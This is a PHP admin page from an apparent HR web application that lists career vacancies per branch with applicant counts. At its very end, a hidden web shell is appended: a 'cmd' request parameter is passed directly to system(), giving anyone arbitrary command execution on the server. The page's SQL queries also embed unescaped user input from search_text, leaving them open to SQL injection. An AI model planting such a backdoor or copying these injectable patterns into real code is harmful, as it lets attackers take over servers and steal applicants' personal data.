<?php
	$myadmin = 'N';
	if(isset($_SESSION['myadmin']))
		$myadmin = $_SESSION['myadmin'];	

	if ($myadmin == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		/*LOG-IN FORM*/
	 	if ($_SESSION['ulcareer_applicants'] == '') 
		{
			$_SESSION['ulcareer_applicants'] = $_SESSION["ulname"];
			$modulename = 'career_applicants';
			$updatedby = $_SESSION["ulname"];
			$logdate = $globaldate;
			$logstamp = $globaldatetime;
			$logtype = 'LOG-IN';
			$query = "INSERT INTO user_log (logdate, logform, logtype, loguser, logstamp) 
					  VALUES ('$logdate', '$modulename', '$logtype', '$updatedby', '$logstamp')";
			mysql_query($query) or die(mysql_error());   	
		}
		/*LOG-IN FORM*/	
		
		$mytag = '';	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}	
		
		$search_text = '';
		$search_text = $_POST["search_text"];	
		
		if(isset($_GET['search_text']))
		{
			if ($_GET['search_text'])
			{
				$search_text = $_GET['search_text'];
			}
		}	
		
		$myblid = $_SESSION['myblid'];
		$myadmin = $_SESSION['myadmin'];
		
		$querydb  = "SELECT 
					 * 
				   FROM 
					 career_list b, branch_list c
				   WHERE
					 b.blid = c.blid and
				   	 b.clactive = 'Y' and
					 b.clname LIKE '%$search_text%' ";
					 
		if ($myblid != '') 	
		{				 
			$querydb  = $querydb . " and b.blid = '$myblid' ";
		}
		
		$querydb  = $querydb . " 
				   ORDER BY 
					 c.blname, b.clname ";
		$resultdb = mysql_query($querydb);
		echo mysql_error();
		$num_count = mysql_num_rows($resultdb);		
		//echo "<br> num_count " . $num_count;
		//echo "<br> querydb " . $querydb;
		
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Career Applicants List</h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
<?php
/*									
							<table width="100%">
								<tr>
									<td align="left">
<form method="post" action="index.php?body=career_applicants_dbase">
Filter By Position
<INPUT TYPE="TEXT" NAME="search_text" VALUE="<?php print($search_text); ?>" SIZE="25" MAXLENGTH="50">
<input type="submit" value="Filter" />
</form>									
									</td>
									<td align="right">&nbsp;

									</td>
								</tr>
							</table>	
*/
?>
Table Information
                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
                            <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
                                <thead>
                                    <tr>
										<th width="20%">Branch</th>
										<th>Date</th>
										<th>Position</th>
										<th>Vacancy</th>
										<th>Total</th>
										<th>New</th>
										<th>Approved</th>
										<th>Denied</th>
										<th>Still Open</th>
										<th>Status</th>
                                    </tr>
                                </thead>
                                <tbody>

								
<?php
//fetch the results from the database
$countdb = $countdb + 1;
while ($rowdb =  mysql_fetch_array ($resultdb)) 
{
	$myclid = $rowdb[clid];

	print("<tr>");

	print("<td align=\"left\" valign=\"middle\">$rowdb[blname] </td>\n");
	print("<td align=\"center\" valign=\"middle\">" .date('m/d/Y', strtotime($rowdb[cldate])). "</td>\n");	
	print("<td align=\"left\" valign=\"middle\">$rowdb[clname] </td>\n");
	print("<td align=\"center\" valign=\"middle\"><strong>$rowdb[clvacancy]</strong> </td>\n");


	print("<td align=\"center\" valign=\"middle\">");
	$queryclname  = "SELECT 
				 * 
			   FROM 
				 career_applicants b
			   WHERE
				 b.clid = '$myclid' and
				 b.caactive = 'Y' ";
	$resultclname = mysql_query($queryclname);
	echo mysql_error();
	$total_count = mysql_num_rows($resultclname);		
	print($total_count);
	print("</td>\n");


	print("<td align=\"center\" valign=\"middle\">");
	$queryclname  = "SELECT 
				 * 
			   FROM 
				 career_applicants b
			   WHERE
				 b.clid = '$myclid' and
				 b.castatus = 'NEW' and 
				 b.caactive = 'Y' ";
	$resultclname = mysql_query($queryclname);
	echo mysql_error();
	$new_count = mysql_num_rows($resultclname);		
	print($new_count);
	print("</td>\n");


	print("<td align=\"center\" valign=\"middle\">");
	$queryclname  = "SELECT 
				 * 
			   FROM 
				 career_applicants b
			   WHERE
				 b.clid = '$myclid' and
				 b.castatus = 'APPROVE' and 
				 b.caactive = 'Y' ";
	$resultclname = mysql_query($queryclname);
	echo mysql_error();
	$approve_count = mysql_num_rows($resultclname);		
	print('<strong>' . $approve_count . '</strong>');
	print("</td>\n");
	

	print("<td align=\"center\" valign=\"middle\">");
	$queryclname  = "SELECT 
				 * 
			   FROM 
				 career_applicants b
			   WHERE
				 b.clid = '$myclid' and
				 b.castatus = 'DENIED' and 
				 b.caactive = 'Y' ";
	$resultclname = mysql_query($queryclname);
	echo mysql_error();
	$denied_count = mysql_num_rows($resultclname);		
	print($denied_count);
	print("</td>\n");	




	print("<td align=\"center\" valign=\"middle\">");
	$bal_count = $rowdb[clvacancy] - $approve_count;	
	print('<strong>' . $bal_count . '</strong>');
	print("</td>\n");	



	print("<td align=\"center\" valign=\"middle\">[ <a title=\"View entry?\" href=\"index.php?body=career_applicants_addeditdel&mybox=edit&clid=$rowdb[clid]&clname=$rowdb[clname]&blcode=$rowdb[blcode]\"> View </a> ] </td>");

	print("</tr>");  
	$countdb = $countdb + 1;
}  
?>		

                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->
<?php
	}
?>		<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>